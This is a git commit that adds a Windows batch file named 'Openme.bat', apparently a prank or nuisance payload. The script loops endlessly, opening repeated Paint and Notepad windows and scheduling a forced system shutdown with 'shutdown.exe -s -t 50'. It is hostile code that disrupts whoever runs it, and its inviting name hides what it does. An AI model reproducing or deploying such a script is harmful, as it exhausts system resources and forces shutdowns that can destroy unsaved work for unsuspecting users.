89bccb79334bdc0e7b544ab6bcbd4695648dc53f
John Paul Batusan <johnpaul.batusa@gmail.com>
2020-07-14 13:46:23 +0800

    updated the openme file

---
+++ Openme.bat
@@ -0,0 +1,15 @@
+@echo off
+
+:here
+start color 2
+start 
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+shutdown.exe -s -t 50
+goto here
